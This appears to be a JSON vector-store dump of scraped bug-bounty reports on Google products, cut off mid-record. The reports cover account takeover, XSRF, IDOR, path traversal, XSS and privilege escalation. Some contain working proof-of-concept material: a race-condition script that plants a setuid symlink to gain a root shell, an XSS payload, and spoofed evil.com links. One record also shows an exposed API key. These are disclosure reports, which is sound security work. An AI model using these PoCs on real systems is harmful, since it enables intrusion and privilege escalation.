{\r\n\"status\": \"active\",\r\n\"first_name\": \"[REDACTED_USERNAME]\",\r\n\"apikey\": \"\r\n444b040499ac70a7ab8985105d139500782fa0e2270d52626036d3470c464d3e\r\n\"\r\nSo, an attacker can use this technique to compromise the mass of the VirusTotal accounts. He can create his email server to generate unlimited emails for accounts registration. The only complexity is to bypass the rate limit and Google-captcha while performing user registration requests, but it is possible with the 3rd party services. Other mentioned requests are not rate-limited.\r\nAnd of course this attack may be automated.\r\nAttack scenario\r\nAny attacker can exploit it in order to compromise the mass of VT accounts. Then he can steal sensitive users data like private hunting rules or graphs, also, he can use VT API spending victim's quota, including VT Enterprise functionality.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3412, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0dbcbcac-edf9-4cf4-9371-aa6953a47bb4": {"__data__": {"id_": "0dbcbcac-edf9-4cf4-9371-aa6953a47bb4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.clean.txt", "file_name": "20250408_175728_701252.clean.txt", "file_type": "text/plain", "file_size": 940, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "74fd59a7-b3cc-43c8-926d-965cd09fbc3d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175728_701252.clean.txt", "file_name": "20250408_175728_701252.clean.txt", "file_type": "text/plain", "file_size": 940, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "dce7eb84840993abf5ee00179e9b9a1c0e1b7a13d11ab26520b0711ccacbd246", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary: Authentication Issue at Monorail API\r\nSteps to reproduce:\r\nCreate an OAuth Token at\r\nhttps://developers.google.com/oauthplayground/\r\n; with @google.com account\r\ncurl \"\r\nhttps://bugs.chromium.org/prpc/monorail.Users/GetUser\"\r\n--data '{\"userRef\":{\"displayName\":\"\r\ncontact@kjsman.me\r\n\"}}' -H \"Authorization: Bearer <OAUTH_TOKEN>\" -H \"Content-Type: application/json\" -H \"accept: application/json\"\r\nNotify that you don't need any XSRF token, and OAuth Playground is outside of Chromium Issue Tracker\r\nBrowser/OS: Any\r\nDetail:\r\nLook at this code:\r\nhttps://cs.chromium.org/chromium/infra/appengine/monorail/api/monorail_servicer.py?l=217\r\n. This allows any request of Googlers without XSRF token.\r\nAttack scenario:\r\nAny attacker may induce Googlers to login his site with google.com(only email scope is required). If the Googler sign in the attacker's site, The attacker can obtain full access as Googler's Chromium Issue Tracker Account.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 940, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "cc998590-070b-4c5c-9ee3-c6a84b9306aa": {"__data__": {"id_": "cc998590-070b-4c5c-9ee3-c6a84b9306aa", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.clean.txt", "file_name": "20250408_175701_103526.clean.txt", "file_type": "text/plain", "file_size": 1145, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "eaebb43a-59ca-440e-bb27-3b81e4ab511e", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175701_103526.clean.txt", "file_name": "20250408_175701_103526.clean.txt", "file_type": "text/plain", "file_size": 1145, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "37facf498a33fe3f2bece8bd26a0879511e0d1f41d546707eb44516300a8fa06", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nHTML INJECTION\r\nProduct:\r\nhttps://bughunters.google.com\r\nURL:\r\nVulnerability type:\r\nOther\r\nDetails\r\nName: [REDACTED_NAME]\r\nEmail: [REDACTED_EMAIL_ADDRESS]\r\nVulnerability Name : HTML INJECTION\r\nVulnerable Domain :\r\nhttps://bughunters.google.com/\r\nWhat is HTML INJECTION?\r\nHypertext Markup Language (HTML) injection is a technique used to take advantage of non-validated input to modify a web page presented by a web application to its users. When applications fail to validate user data, an attacker can send HTML-fomatted text to modify site content that gets presented to other users.\r\nSteps to Reproduce:\r\nCreate a account on\r\nand fill details until it ask for the impact and other details\r\nEnter the text as payload herr i used <img src=http://tny.im/tK->\r\nand in review section you will see this.\r\nReferences:\r\nhttps://hackerone.com/reports/1081656\r\nAttack scenario\r\nIMPACT:\r\nIt can allow an attacker to modify the page. To steal another person's identity. The attacker discovers injection vulnerability and decides to use an HTML injection attack.\r\nPlanned disclosure date:\r\nSun Jan 01 2023 00:00:00 GMT+0530 (India Standard Time)", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1145, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "13389175-86a7-4283-80b6-6452d57c5c61": {"__data__": {"id_": "13389175-86a7-4283-80b6-6452d57c5c61", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.clean.txt", "file_name": "20250408_175645_174735.clean.txt", "file_type": "text/plain", "file_size": 2911, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "a79abfa5-369b-46f6-853d-579bf5421b5d", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175645_174735.clean.txt", "file_name": "20250408_175645_174735.clean.txt", "file_type": "text/plain", "file_size": 2911, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "c8940e4afeb8b0488eccbaf15986ba3a7553433e660100f730a70964ee1ce321", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nChild Injection in Google Drive macOS app allows to abuse Google Drive app to escalate TCC permissions\r\nProduct:\r\nGoogle Drive\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nContext\r\nIn macOS a process is considered a security boundary. This is why macOS implements several defense mechanisms that prevent even processes from the same user (or from root) to be able to inject code in a different process.\r\nThis is done because executables can have extra permissions via entitlements or can manage sensitive information inside of it.\r\nHowever, these privileges are usually inherited by processes created by the application. This means that if an application has a privileged entitlement or has been grantes some TCC permissions, any process created by that application will also have that entitlement.\r\nIt was found that the\r\napplication is vulnerable to Child Process injection. This means that an attacker could inject a child in the Google Drive application and abuse those entitlements to access to the user's sensitive information.\r\nImpact\r\nThe\r\napplication has an entitlement to request access to the users Photos:\r\ncom.apple.security.personal-information.photos-library\r\n.\r\nThis means that an attacker could inject a child in the Google Drive application and abuse that entitlement to access to the user's photos.\r\nNote that access to that resource might prompt a dialog to the user asking for permission. However, the user might not suspect that the application requesting access is\r\nand grant the access. Or if the user already used\r\nbefore, the user might have already granted access to those permissions to\r\nand the dialog won't be prompted again.\r\nMoreover, a malicious application could also abuse the child injection in the application to make\r\nrequest acccess to other TCC protected resources like Desktop or Documents so the user doesn't suspect and then abuse the granted access through\r\nto access those resources.\r\nOther CVEs\r\nThese other CVEs were assigned to apps with a similar vulnerability:\r\nhttps://wojciechregula.blog/post/how-to-rob-a-firefox/\r\nhttps://github.com/Zeyad-Azima/CVE-2023-26818\r\nPoC\r\nThe following PoC makes Google Drive launch an iTerm2 terminal with it's privileges. This means that the iTerm2 terminal will have the same privileges as Google Drive, including the\r\nentitlement.\r\nAn attacker could abuse this to execute a backdoor instead of a terminal.\r\nopen -a \"Google Drive\" --args --debugger_command \"/Applications/iTerm.app/Contents/MacOS/iTerm2\"\r\nA video showing this was attached.\r\nDisclaimer\r\nThis proposed vulnerability is part of a research that will be potentially presented in some cybersecurity conference(s).\r\nAttack scenario\r\nAnyone with access to a macOS computer can abuse the Google Drive application to access whatever Google Drive has access to, or to make Google Drive ask for permissions and then abuse those permissions once granted.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2911, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "874f84c6-d7df-4ee3-bfcb-fecfcbbcd1a5": {"__data__": {"id_": "874f84c6-d7df-4ee3-bfcb-fecfcbbcd1a5", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.clean.txt", "file_name": "20250408_175638_159709.clean.txt", "file_type": "text/plain", "file_size": 2444, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "93d9dda4-c808-4339-9ac9-4e195441b1a0", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175638_159709.clean.txt", "file_name": "20250408_175638_159709.clean.txt", "file_type": "text/plain", "file_size": 2444, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "31c20627e42b43dc6bbc7888921f5142d944f801df50ec7a24980aba7e9d6518", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nBucket traversal in google.cloud.storage.transfer_manager.upload_chunks_concurrently()\r\nProgram:\r\nOSS VRP\r\nURL:\r\nhttps://github.com/googleapis/python-storage\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Team,\r\nThe method\r\ngoogle.cloud.storage.transfer_manager.upload_chunks_concurrently()\r\nis vulnerable to a variant of a path (bucket) traversal.\r\nThis method was added relatively recently and makes use of the\r\nXML API multipart uploads API\r\nhttps://github.com/googleapis/python-storage/releases/tag/v2.11.0\r\nhttps://github.com/googleapis/python-storage/pull/1115/files\r\nIssue stems from the fact that the URL path is not properly validated & the forward slash\r\n/\r\nis not\r\nURL encoded\r\n.\r\nurl = \"{hostname}/{bucket}/{blob}\".format(\r\nhostname=hostname, bucket=bucket.name, blob=blob.name\r\n)\r\nhttps://github.com/googleapis/python-storage/blob/d5d3c68a6e5c6f8cefc59892c1ccceaf181ff32d/google/cloud/storage/transfer_manager.py#L1084-L1087\r\nAs a result, if\r\nblob.name\r\nis supplied from user input, then an attacker could make use of the classic\r\ndot-dot-slash\r\ntechnique and upload a file to a bucket unintended by the victim eg.\r\n../bucket/object\r\nPoC based on the official\r\nsample snippet\r\nhttps://drive.google.com/file/d/1_NAaJ-PjQRy7kcEJ4NW7sZ-YdfF79S5g/view?usp=drive_link\r\nAttack scenario\r\nDepending on the IAM permissions granted to the underlying Service Account this could lead to malicious scenarios such as:\r\noverwriting existing files (data & integrity loss)\r\nupload of an object later consumed by an application (config override, XSS etc.)\r\nPatch proposal\r\nI reviewed other methods and it seems that everywhere else the\r\ngoogle.cloud.storage.blob. _quote()\r\nfunction is used to escape/encode special characters.\r\nThe intuitive approach would suggest to reuse this existing method in this instance as well.\r\ndiff --git a/google/cloud/storage/transfer_manager.py b/google/cloud/storage/transfer_manager.py\r\nindex 8190f84..cac3404 100644\r\n--- a/google/cloud/storage/transfer_manager.py\r\n+++ b/google/cloud/storage/transfer_manager.py\r\n@@ -32 +32 @@ from google.cloud.storage import Blob\r\n-from google.cloud.storage.blob import _get_host_name\r\n+from google.cloud.storage.blob import _get_host_name, _quote\r\n@@ -1086 +1086 @@ def upload_chunks_concurrently(\r\n-        hostname=hostname, bucket=bucket.name, blob=blob.name\r\n+        hostname=hostname, bucket=bucket.name, blob=_quote(blob.name)\r\nWith kind regards,\r\n[REDACTED_USERNAME]", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2444, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "459e93ca-c3e2-4f5c-a911-70e0d7532f8e": {"__data__": {"id_": "459e93ca-c3e2-4f5c-a911-70e0d7532f8e", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.clean.txt", "file_name": "20250408_175712_774594.clean.txt", "file_type": "text/plain", "file_size": 1410, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "4fdf6083-baf2-439f-9086-a0d64c8a8094", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175712_774594.clean.txt", "file_name": "20250408_175712_774594.clean.txt", "file_type": "text/plain", "file_size": 1410, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "808e35a1db3e1345e41a36b6a9ca04d76b2269c56cb5eb2bac15b932f4ad11fe", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nIDOR in primer.googlecnapps.cn leads to change user's skill\r\nProduct:\r\nhttps://primer.googlecnapps.cn/\r\nURL:\r\nhttps://primer.googlecnapps.cn/primer/wechat/updateSelectedSkillsAndAuthStutas\r\nVulnerability type:\r\nPermissions Bypass\r\nDetails\r\nIDOR in primer.googlecnapps.cn leads to change user's skills\r\nurl:\r\nrelevant product:\r\nwechat miniprogram:\r\n\u8c37\u6b4c\u6210\u957f\u6307\u5357\r\nafter opening the wechat miniprogram:\r\nin wechat,  you can request the package  as follows in manageing skills.\r\nPOST /primer/wechat/updateSelectedSkillsAndAuthStutas HTTP/1.1\r\nHost: primer.googlecnapps.cn\r\nConnection: close\r\nContent-Length: 162\r\nUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 MicroMessenger/7.0.9.501 NetType/WIFI MiniProgramEnv/Windows WindowsWechat\r\ncontent-type: application/json\r\nReferer:\r\nhttps://servicewechat.com/wx7dbcdf859b383726/60/page-frame.html\r\nAccept-Encoding: gzip, deflate\r\n{\"userIdEncrypt\":\"[REDACTED_ID]\",\"userId\":[REDACTED_ID],\"selectedSkillInfo\":[6279416820793344,5412462388051968,5816948650672128],\"checkDiffer\":true}\r\nThe value of userIdEncrypt is the BASE64 encoding of userId. Modifying  others' skill  can be done by changing the value of userIdEncrypt and userId  as others'.\r\nAttack scenario\r\nIt is easy to modify the user's skill.And system recommand courses by skills.This will cause bad experience for users.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1398, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "384f11b0-c10b-4e1b-9d1f-2f2cc1b02c99": {"__data__": {"id_": "384f11b0-c10b-4e1b-9d1f-2f2cc1b02c99", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.clean.txt", "file_name": "20250408_175708_149968.clean.txt", "file_type": "text/plain", "file_size": 2564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "040a8228-9f17-4c50-af1d-1fa0c601d4c5", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175708_149968.clean.txt", "file_name": "20250408_175708_149968.clean.txt", "file_type": "text/plain", "file_size": 2564, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "536af981ff7b3888858a791f75e0fbe5de38df8c5c32d6996d76ba7de8078fb3", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nMultiple issues with Markdown and URL parsing\r\nProduct:\r\nURL:\r\nissuetracker.google.com\r\nVulnerability type:\r\nOther\r\nDetails\r\nHi Google,\r\nI would like to report an issue where attackers can trick Google Security Triage Team by manipulating with links in markdown fields.\r\nIssue tracker\r\nis also vulnerable to tab nabbing, this can be dangerous since  the triage team may be affected by this attack.\r\nProof of concept:\r\nftp://evil.com\r\nhttp://2130706433\r\n[POC](http:2130706433)\r\n-> Result  =\r\nPOC\r\n[POC2](ftp:evil.com)\r\nPOC2\r\nwww.google.com%2Famgad-esam%3Fpoc=@https://evil.com\r\n[2130706433.google.com](http:2130706433/.google.com)\r\n-> Result =\r\n2130706433.google.com\r\nftp://google.com:\\@evil.com\r\nhttp://google.com:\\@2130706433\r\nhttp://127.0.0.1\r\n<ftp://google.com@evil.com>\r\n<ftp:/google.com@evil.com>\r\n[http://google.com](ftp://google.com@evil.com)\r\n[http://google.com](ftp:/google.com@evil.com)\r\n[google.com](ftp:%67%6f%6f%67%6c%65%2e%63%6f%6d@%65%76%69%6c%2e%63%6f%6d)\r\nAttack scenario\r\nAny security researcher might be able to trick someone of the triage team\r\nPlanned disclosure date:\r\nThu Jun 30 2022 00:00:00 GMT+0200 (Eastern European Standard Time)\r\nSteps to reproduce & Proof of concept:\r\nPlease open\r\nissue tracker\r\n.\r\nOpen any issue, let's take our report as an example:\r\nProof of concept\r\nAt Markdown field, Inject the following payloads:\r\nBypass External link warning.\r\nMarkdown field trusts and accepts the ftp protocol (I noticed that this payload is not accepted in [HackerOne] (\r\nhttps://hackerone.com\r\n) Markdown fields, That's why I think this is should be a bug.)\r\nWe are going to exploit this later with another tricky method.\r\nPOC:\r\nPOC2:\r\nMarkdown field converts equivalent integers to IP addresses.\r\nPOC3:\r\nPOC4:\r\nI am not able to reproduce it now, not sure if I did something wrong or you fixed it!\r\n. + As mentioned above, since integer values are presented as IP addresses; Attackers might be able to trick a team member into thinking that 2130706433/ is a subdomain of example.com.\r\nPOC5:\r\nThe rest of the payloads are the same idea but in different methods.\r\nPOC6:\r\nPOC7:\r\nPOC8:\r\nftp://google.com@evil.com\r\nPOC9:\r\nftp:/google.com@evil.com\r\nPOC10:\r\nhttp://google.com\r\nPOC11:\r\nPOC12:\r\ngoogle.com\r\nReference:\r\nhttps://hackerone.com/reports/113070\r\nAttack Scenario:\r\nAttackers may be able to trick the triage team members with these manipulated links.\r\nAlso don't forget about the tab-nabbing attack, attackers may be able to redirect one of the triage team members to their malicious server or steal some sensitive information!", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2564, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "45bf5799-3266-49cd-9a8f-8324e17952d9": {"__data__": {"id_": "45bf5799-3266-49cd-9a8f-8324e17952d9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.clean.txt", "file_name": "20250408_175705_860089.clean.txt", "file_type": "text/plain", "file_size": 2768, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "ec251bbe-b391-4979-8feb-7e797b1e8445", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175705_860089.clean.txt", "file_name": "20250408_175705_860089.clean.txt", "file_type": "text/plain", "file_size": 2768, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "e63782d509ce57224360c5b906d8e0c6ef3f510df15b55fe28fd8358d3603f50", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nGoogle Drive for Desktop macOS installer contains a local privilege escalation vulnerability.\r\nProduct:\r\nGoogle Drive\r\nVulnerability type:\r\nPrivilege Escalation\r\nDetails\r\nGoogle Drive for Desktop (version 62.0.1.0) macOS installer contains a local privilege escalation vulnerability.\r\nIn the postinstall script of GoogleDrive.pkg, the following \"setuid\" function called for adding setuid permission to executables (load_dfsfuse, mount_dfsfuse, and mount_helper).\r\n#!/usr/bin/env sh\r\nset -x\r\nCONTENTS_ROOT=\"/Applications/Google Drive.app/Contents\"\r\nRESOURCES_ROOT=\"$CONTENTS_ROOT/Resources\"\r\nBINARIES_ROOT=\"$CONTENTS_ROOT/MacOS\"\r\nLOAD_DFSFUSE=\"$BINARIES_ROOT/load_dfsfuse\"\r\nMOUNT_DFSFUSE=\"$BINARIES_ROOT/mount_dfsfuse\"\r\nMOUNT_HELPER=\"$BINARIES_ROOT/mount_helper\"\r\n# Must be called after cleanup and before starting the new application.\r\nsetuid() {\r\n# setuid the load_dfsfuse and mount_dfsfuse binaries.\r\nchmod u+s \"$LOAD_DFSFUSE\"\r\nchmod u+s \"$MOUNT_DFSFUSE\"\r\nchmod u+s \"$MOUNT_HELPER\"\r\n}\r\nUnfortunately, during the installation, it does not check whether these three files are a symbolic link before adding setuid. So, if an attacker can place symbolic link to the executable owned by root (e.g., executables under /usr/local/bin/ ), setuid attribute is set to its executable. Then,  he can run the executable with root permission.\r\nCreating a symbolic link is usually prohibited because files under \"/Application/Google Drive.app/Contents/MacOS\" is owned by root. However, an attacker can create \"/Application/Google Drive.app/Contents/MacOS\" directory owned by a non-root user before the package installation. The installer does not delete this existing directory, and load_dfsfuse, mount_dfsfuse, and mount_helper are copied to the directory owned by the non-root user. So, an attacker can delete load_dfsfuse (, mount_dfsfuse, or mount_helper) and create a symbolic link.\r\nI have created PoC. The steps to reproduce are as follows.\r\nThe following python script is saved as win_race.py. and run this script. In this PoC,  setuid attribute is set to /opt/local/bin/fish executable. This executable is installed via Mac Ports (\r\nhttps://www.macports.org\r\n) package manager.\r\nimport os\r\nwhile True:\r\ntry:\r\nos.system(\"mkdir -p '/Applications/Google Drive.app/Contents/MacOS'\")\r\nif os.stat(\"/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse\").st_uid == 0:\r\nos.system(\"rm -f '/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse'\")\r\nos.system(\"ln -s /opt/local/bin/fish '/Applications/Google Drive.app/Contents/MacOS/load_dfsfuse'\")\r\nexcept:\r\npass\r\nRun the installer.\r\nSetuid is set to /opt/local/bin/fish.\r\nRun /opt/local/bin/fish and gain a root shell\r\nAttack scenario\r\nA local attacker can exploit this vulnerability and escalate its privilege.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2768, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4f010a24-7eca-4fa3-a21f-9c7278baca20": {"__data__": {"id_": "4f010a24-7eca-4fa3-a21f-9c7278baca20", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.clean.txt", "file_name": "20250408_175656_633215.clean.txt", "file_type": "text/plain", "file_size": 1123, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "54470bbd-d301-4efa-85f7-118ed3e0b1fc", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175656_633215.clean.txt", "file_name": "20250408_175656_633215.clean.txt", "file_type": "text/plain", "file_size": 1123, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "570913edbf2c397fca4188cc86b9796e46ba15785ee3be8c1143ce20d3b13a4b", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nPotential XSS in html/template in golang\r\nProduct:\r\nGolang\r\nURL:\r\nhttps://pkg.go.dev/html/template\r\nVulnerability type:\r\nCross-site scripting (XSS)\r\nDetails\r\nhtml/template\r\ndoes not respect the '`' (backtick) character which can be used while defining strings in Javascript. This can/could potentially be used to perform XSS on a server using html/template as it's templating engine.\r\nAttack scenario\r\nFor example for the following html template code:\r\n<!DOCTYPE html>\r\n<html>\r\n<head>\r\n<meta charset=\"UTF-8\">\r\n<title>Hello, {{.Name}}</title>\r\n<script>\r\nvar welcome_msg = `Hello,  <a href='/{{.UserID}}'>{{.Name}}</a>`;\r\nconst h1 = document.createElement('h1');\r\nh1.innerHTML = welcome_msg;\r\ndocument.body.appendChild(h1);\r\n</script>\r\n<style>\r\n</style>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\nIf the following data is provided:\r\n{\r\nName:   \"My page`; eval(`alert(1)`); var tmp =`\",\r\nUserID: \"4ebe354b-cb01-45b5-aa3e-aa2fe2f98091\",\r\n}\r\nThe resulting html page (output page attached) that is rendered by the template engine will allow the attacker to evaluate arbitrary javascript (in our case it will evaluate alert(1))", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1123, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "8bd8b5f9-6a43-4edc-a180-5ee2ce6fdc70": {"__data__": {"id_": "8bd8b5f9-6a43-4edc-a180-5ee2ce6fdc70", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.clean.txt", "file_name": "20250408_175654_211238.clean.txt", "file_type": "text/plain", "file_size": 801, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "70154f66-d455-4389-b281-1ad3dbaed4db", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175654_211238.clean.txt", "file_name": "20250408_175654_211238.clean.txt", "file_type": "text/plain", "file_size": 801, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "hash": "b88cbe34ad671284c80e1032bdac9808c7cb8d4a7b8ca750fe47e6632797fc05", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Summary:\r\nSOP bypass via Tag Assistant Legacy\r\nProduct:\r\nGoogle Tag Assistant\r\nURL:\r\nhttps://chrome.google.com/webstore/detail/tag-assistant-legacy-by-g/kejbdjndbnbjgmefkgdddjlbokphdefk/\r\nVulnerability type:\r\nSensitive data exposure\r\nDetails\r\nIn the context of the content script on an attacker controlled website:\r\nchrome.runtime.sendMessage({message: 'LoadScript', url: '\r\nhttps://www.google.com'}\r\n, console.log);\r\nAttack scenario\r\nA compromised renderer can bypass the same origin policy.\r\nI don't think this includes cookies however this may leak sensitive data from the user internal network.\r\nFor example chrome.runtime.sendMessage({message: 'LoadScript', url: '\r\nhttp://192.168.1.1'}\r\n, console.log); leaks the login page of my router which is not ideal.\r\nDone as part of Grant issue 286169438", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 801, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0abb049a-adb6-4d97-8704-0b9c0e53940c": {"__data__": {"id_": "0abb049a-adb6-4d97-8704-0b9c0e53940c", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.clean.txt", "file_name": "20250408_175726_429657.clean.txt", "file_type": "text/plain", "file_size": 0, "creation_date": "2025-04-22", "last_modified_date": "2025-04-22"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "6fc335f5-99fb-4dea-b53c-d9e638772efd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175726_429657.clean.txt", "file_name": "20250408_175726_429657.clean.txt", "file_type": 